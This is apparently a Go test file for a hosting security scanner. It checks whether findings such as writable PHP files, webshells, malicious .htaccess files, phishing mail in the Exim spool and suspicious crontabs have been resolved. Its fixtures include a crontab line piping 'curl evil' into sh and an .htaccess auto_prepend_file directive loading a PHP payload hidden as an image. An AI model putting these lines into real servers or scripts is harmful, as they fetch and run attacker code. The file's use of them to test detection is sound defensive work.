package checks

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func withQuarantineAllowedRoots(t *testing.T, dir string) {
	t.Helper()
	old := fixQuarantineAllowedRoots
	fixQuarantineAllowedRoots = []string{dir}
	t.Cleanup(func() { fixQuarantineAllowedRoots = old })
}

func withHtaccessAllowedRoots(t *testing.T, dir string) {
	t.Helper()
	old := fixHtaccessAllowedRoots
	fixHtaccessAllowedRoots = []string{dir}
	t.Cleanup(func() { fixHtaccessAllowedRoots = old })
}

func TestVerifyFindingWorldWritable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)

	fixed := filepath.Join(tmp, "fixed.php")
	if err := os.WriteFile(fixed, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(fixed, 0644); err != nil {
		t.Fatal(err)
	}
	res := VerifyFinding("world_writable_php", "", "", fixed)
	if !res.Checked || !res.Resolved {
		t.Errorf("fixed file should verify resolved, got %+v", res)
	}

	loose := filepath.Join(tmp, "loose.php")
	if err := os.WriteFile(loose, []byte("<?php"), 0666); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(loose, 0666); err != nil {
		t.Fatal(err)
	}
	res = VerifyFinding("world_writable_php", "", "", loose)
	if !res.Checked || res.Resolved {
		t.Errorf("still world-writable file should verify unresolved, got %+v", res)
	}
}

func TestVerifyFindingGroupWritable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)

	target := filepath.Join(tmp, "g.php")
	if err := os.WriteFile(target, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(target, 0660); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("group_writable_php", "", "", target); !res.Checked || res.Resolved {
		t.Errorf("group-writable file should verify unresolved, got %+v", res)
	}
	if err := os.Chmod(target, 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("group_writable_php", "", "", target); !res.Checked || !res.Resolved {
		t.Errorf("group-fixed file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingMissingFileResolved(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)
	res := VerifyFinding("world_writable_php", "", "", filepath.Join(tmp, "gone.php"))
	if !res.Checked || !res.Resolved {
		t.Errorf("missing file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingSymlinkNotVerifiable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)
	real := filepath.Join(tmp, "real.php")
	if err := os.WriteFile(real, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(tmp, "link.php")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("world_writable_php", "", "", link); res.Checked {
		t.Errorf("symlink should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingRejectsSymlinkAncestor(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)
	outside := t.TempDir()
	target := filepath.Join(outside, "fixed.php")
	if err := os.WriteFile(target, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	linkDir := filepath.Join(tmp, "linked")
	if err := os.Symlink(outside, linkDir); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("world_writable_php", "", "", filepath.Join(linkDir, "fixed.php")); res.Checked {
		t.Errorf("path through symlinked directory should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingQuarantineFamilyPresenceBased(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)

	present := filepath.Join(tmp, "shell.php")
	if err := os.WriteFile(present, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("webshell", "", "", present); !res.Checked || res.Resolved {
		t.Errorf("present webshell should verify unresolved, got %+v", res)
	}
	if res := VerifyFinding("phishing_page", "", "", filepath.Join(tmp, "gone.html")); !res.Checked || !res.Resolved {
		t.Errorf("removed file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingPresenceEmptyPathAndOutsideRootNotVerifiable(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)

	if res := VerifyFinding("webshell", "no path here", ""); res.Checked || res.Resolved {
		t.Errorf("missing presence path should not be auto-verifiable, got %+v", res)
	}

	outside := filepath.Join(t.TempDir(), "shell.php")
	if res := VerifyFinding("webshell", "", "", outside); res.Checked || res.Resolved {
		t.Errorf("outside presence path should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingPresenceStatErrorNotResolved(t *testing.T) {
	withQuarantineAllowedRoots(t, "/home")
	target := "/home/alice/public_html/shell.php"
	withMockOS(t, &mockOS{
		lstat: func(name string) (os.FileInfo, error) {
			switch name {
			case "/home", "/home/alice", "/home/alice/public_html":
				return accountScanFakeInfo{name: filepath.Base(name), mode: os.ModeDir | 0755, isDir: true}, nil
			case target:
				return nil, os.ErrPermission
			default:
				return nil, os.ErrNotExist
			}
		},
	})

	if res := VerifyFinding("webshell", "", "", target); res.Checked || res.Resolved {
		t.Errorf("presence stat error should not verify resolved, got %+v", res)
	}
}

func TestVerifyFindingPresenceTargetSymlinkStillPresent(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)
	outside := t.TempDir()
	target := filepath.Join(outside, "shell.php")
	if err := os.WriteFile(target, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(tmp, "shell.php")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}

	if res := VerifyFinding("symlink_attack", "", "", link); !res.Checked || res.Resolved {
		t.Errorf("present symlink target should verify unresolved, got %+v", res)
	}
}

func TestVerifyFindingPresenceNonDirectoryAncestorNotResolved(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)
	ancestor := filepath.Join(tmp, "not-dir")
	if err := os.WriteFile(ancestor, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}

	if res := VerifyFinding("webshell", "", "", filepath.Join(ancestor, "shell.php")); res.Checked || res.Resolved {
		t.Errorf("non-directory ancestor should not verify resolved, got %+v", res)
	}
}

func TestVerifyFindingPathAbsentRejectsSymlinkAncestor(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)
	outside := t.TempDir()
	linkDir := filepath.Join(tmp, "linked")
	if err := os.Symlink(outside, linkDir); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("webshell", "", "", filepath.Join(linkDir, "gone.php")); res.Checked {
		t.Errorf("absent path through symlinked directory should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingPathAbsentRejectsSymlinkAllowedRoot(t *testing.T) {
	realRoot := t.TempDir()
	linkParent := t.TempDir()
	linkRoot := filepath.Join(linkParent, "home")
	if err := os.Symlink(realRoot, linkRoot); err != nil {
		t.Fatal(err)
	}
	withQuarantineAllowedRoots(t, linkRoot)

	if res := VerifyFinding("webshell", "", "", filepath.Join(linkRoot, "gone.php")); res.Checked || res.Resolved {
		t.Errorf("absent path through symlinked allowed root should not verify resolved, got %+v", res)
	}
}

func TestVerifyFindingHtaccess(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)

	dirty := filepath.Join(tmp, ".htaccess")
	if err := os.WriteFile(dirty, []byte("php_value auto_prepend_file \"/home/u/public_html/uploads/evil.png\"\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_auto_prepend", "", "", dirty); !res.Checked || res.Resolved {
		t.Errorf("malicious .htaccess should verify unresolved, got %+v", res)
	}

	clean := filepath.Join(tmp, "clean", ".htaccess")
	if err := os.MkdirAll(filepath.Dir(clean), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(clean, []byte("# nothing dangerous\nOptions -Indexes\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", clean); !res.Checked || !res.Resolved {
		t.Errorf("clean .htaccess should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingHtaccessNonHtaccessNotVerifiable(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)
	notH := filepath.Join(tmp, "config.php")
	if err := os.WriteFile(notH, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", notH); res.Checked {
		t.Errorf("non-.htaccess path should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingHtaccessDirectoryNotResolved(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)
	dir := filepath.Join(tmp, ".htaccess")
	if err := os.Mkdir(dir, 0755); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", dir+string(os.PathSeparator)); res.Checked {
		t.Errorf(".htaccess directory should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingHtaccessRejectsSymlinkAncestor(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, ".htaccess"), []byte("# clean\n"), 0644); err != nil {
		t.Fatal(err)
	}
	linkDir := filepath.Join(tmp, "public_html")
	if err := os.Symlink(outside, linkDir); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", filepath.Join(linkDir, ".htaccess")); res.Checked {
		t.Errorf(".htaccess through symlinked directory should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingEximSpool(t *testing.T) {
	tmp := t.TempDir()
	oldSpool := eximSpoolDirs
	eximSpoolDirs = []string{tmp}
	t.Cleanup(func() { eximSpoolDirs = oldSpool })

	msgID := "1abcde-123456-AB"
	msg := "Phishing email queued (message: " + msgID + ")"
	// No spool file present -> resolved.
	if res := VerifyFinding("email_phishing_content", msg, ""); !res.Checked || !res.Resolved {
		t.Errorf("absent spool message should verify resolved, got %+v", res)
	}
	// Header file present -> unresolved.
	if err := os.WriteFile(filepath.Join(tmp, msgID+"-H"), []byte("hdr"), 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("email_phishing_content", msg, ""); !res.Checked || res.Resolved {
		t.Errorf("queued spool message should verify unresolved, got %+v", res)
	}
}

func TestVerifyFindingEximSpoolStatErrorNotResolved(t *testing.T) {
	oldSpool := eximSpoolDirs
	eximSpoolDirs = []string{"/var/spool/exim/input"}
	t.Cleanup(func() { eximSpoolDirs = oldSpool })

	oldOS := osFS
	osFS = &mockOS{
		lstat: func(string) (os.FileInfo, error) {
			return nil, os.ErrPermission
		},
	}
	t.Cleanup(func() { osFS = oldOS })

	msgID := "1abcde-123456-AB"
	msg := "Phishing email queued (message: " + msgID + ")"
	if res := VerifyFinding("email_phishing_content", msg, ""); res.Checked || res.Resolved {
		t.Errorf("spool stat error should not verify resolved, got %+v", res)
	}
}

func TestVerifyFindingCrontab(t *testing.T) {
	tmp := t.TempDir()
	withCrontabAllowedRoots(t, tmp)

	cron := filepath.Join(tmp, "baduser")
	if err := os.WriteFile(cron, []byte("* * * * * curl evil|sh\n"), 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("suspicious_crontab", "", "", cron); !res.Checked || res.Resolved {
		t.Errorf("non-empty crontab should verify unresolved, got %+v", res)
	}
	if err := os.WriteFile(cron, nil, 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("suspicious_crontab", "", "", cron); !res.Checked || !res.Resolved {
		t.Errorf("emptied crontab should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingUnknownTypeNotVerifiable(t *testing.T) {
	if res := VerifyFinding("brute_force", "SSH brute force", ""); res.Checked {
		t.Errorf("unknown type should not be auto-verifiable, got %+v", res)
	}
}

// TestCanVerifyMembership documents the verifiable set and guards two
// invariants: every verifiable check is a real registered finding type (no
// phantom names), and event findings are never verifiable.
func TestCanVerifyMembership(t *testing.T) {
	verifiable := []string{
		"world_writable_php", "group_writable_php",
		"email_phishing_content", "suspicious_crontab",
		"outdated_plugins", "wp_core_integrity",
	}
	verifiable = append(verifiable, presenceVerifiableChecks...)
	verifiable = append(verifiable, htaccessVerifiableChecks...)

	for _, c := range verifiable {
		if !CanVerify(c) {
			t.Errorf("CanVerify(%q) = false, want true", c)
		}
		if _, ok := LookupCheck(c); !ok {
			t.Errorf("verifiable check %q is not in the check registry (phantom name)", c)
		}
	}

	// Event findings and not-yet-supported state findings must NOT show a
	// Re-check button.
	for _, c := range []string{
		"supply_chain_vuln",
		"brute_force", "mail_bruteforce", "ip_reputation",
		"modsec_block_realtime", "cpanel_login", "db_spam_found",
		"", "definitely_not_a_check",
	} {
		if CanVerify(c) {
			t.Errorf("CanVerify(%q) = true, want false", c)
		}
	}
}

func TestCanVerifyDoesNotAdvertiseDefaultVerifier(t *testing.T) {
	verifiable := []string{
		"world_writable_php", "group_writable_php",
		"email_phishing_content", "suspicious_crontab",
		"outdated_plugins", "wp_core_integrity",
	}
	verifiable = append(verifiable, presenceVerifiableChecks...)
	verifiable = append(verifiable, htaccessVerifiableChecks...)

	for _, c := range verifiable {
		path := "/home/alice/public_html/missing.php"
		msg := "Finding at " + path
		switch {
		case c == "email_phishing_content":
			path = ""
			msg = "Phishing email queued (message: 1abcde-123456-AB)"
		case c == "suspicious_crontab":
			path = "/var/spool/cron/alice"
			msg = "Suspicious crontab: " + path
		case strings.HasPrefix(c, "htaccess_"):
			path = "/home/alice/public_html/.htaccess"
			msg = "Malicious .htaccess: " + path
		}
		res := VerifyFinding(c, msg, "", path)
		if strings.Contains(res.Detail, "no automated re-check available") {
			t.Errorf("CanVerify(%q) = true but VerifyFinding used default verifier: %+v", c, res)
		}
	}
}

func TestVerifyFindingEmptyPathNotVerifiable(t *testing.T) {
	if res := VerifyFinding("world_writable_php", "no path here", ""); res.Checked {
		t.Errorf("missing path should not be auto-verifiable, got %+v", res)
	}
}
